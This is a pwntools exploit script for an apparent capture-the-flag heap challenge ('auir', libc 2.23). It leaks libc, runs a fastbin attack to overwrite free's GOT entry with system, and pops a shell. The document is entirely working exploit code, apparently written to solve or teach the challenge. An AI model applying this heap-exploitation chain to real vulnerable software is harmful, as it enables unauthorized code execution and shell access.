from pwn import *

# Establish the target binary and libc version
target = process('./auir', env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF('./auir')
libc = ELF('libc-2.23.so')
#gdb.attach(target)

#Establish the functions to interact with the elf
def makeZealot(size, content):
    target.recvuntil(">>")
    target.sendline('1')
    target.recvuntil(">>")
    target.sendline(str(size))
    target.recvuntil(">>")
    target.send(content.encode())

def destroyZealot(index):
    target.recvuntil(">>")
    target.sendline('2')
    target.recvuntil(">>")
    target.sendline(str(index))

def fixZealot(index, size, content):
    target.recvuntil(">>")
    target.sendline('3')
    target.recvuntil(">>")
    target.sendline(str(index))
    target.recvuntil(">>")
    target.sendline(str(size))
    target.recvuntil(">>")
    target.send(content)

def showZealot(index):
    target.recvuntil(">>")
    target.sendline('4')
    target.recvuntil(">>")
    target.sendline(str(index))

# Make the inital chunks for the libc infoleak
makeZealot(0xf0, "0"*0xf0)#	0
makeZealot(0x70, "1"*0x70)#	1
makeZealot(0xf0, "2"*0xf0)#	2
makeZealot(0x30, "3"*0x30)#	3

# Free the bottom to chunks, to align arena libc pointer with chunk 2
destroyZealot(3)
destroyZealot(2)

# Leake the libc pointer stored in chunk 2
showZealot(2)

# Parse out the infoleak, calculate libc base
target.recvuntil("[*]SHOWING....\n")

leak = target.recvuntil(b"|").strip(b"|")
leak = u64(leak + b"\x00"*(8 - len(leak)))
libcBase = leak - 0x3c4b78

print("libc base: " + hex(libcBase))

# Calculate the address of the fake chunk
fakeChunk = 0x605310 - 0x23

# Make our two chunks for the fastbin attack
makeZealot(0x60, "1"*0x60)# 4
makeZealot(0x60, "2"*0x60)# 5

# Free those two chunks
destroyZealot(4)
destroyZealot(5)

# Edit chunk 5 which is on top of the fastbin list, overwrite the pointer to the next fastbin with our fakechunk address
fixZealot(5, 0x60, p64(fakeChunk) + p64(0) + b"0"*80)

# Allocate a new chunk, move our fake chunk to the top of the fastbin list
makeZealot(0x60, "6"*0x60)# 6

# Allocate a new chunk, which will be our fake chunk right before the heap ptrs stored in the bss
makeZealot(0x60, "0")# 7

# Overwrite the first heap ptr with the got table entry for free
fixZealot(7, 0x1b, '0'*0x13 + p64(elf.got['free']))

# Overwrite got entry for free with system
fixZealot(0, 0x8, p64(libcBase + libc.symbols['system']))

# Write the string `/bin/sh` to chunk 1
fixZealot(1, 0x9, "/bin/sh\x00")

# Free chunk 1 to call system("/bin/sh")
destroyZealot(1)

# Drop to an interactive shell to use our newly popped shell
target.interactive()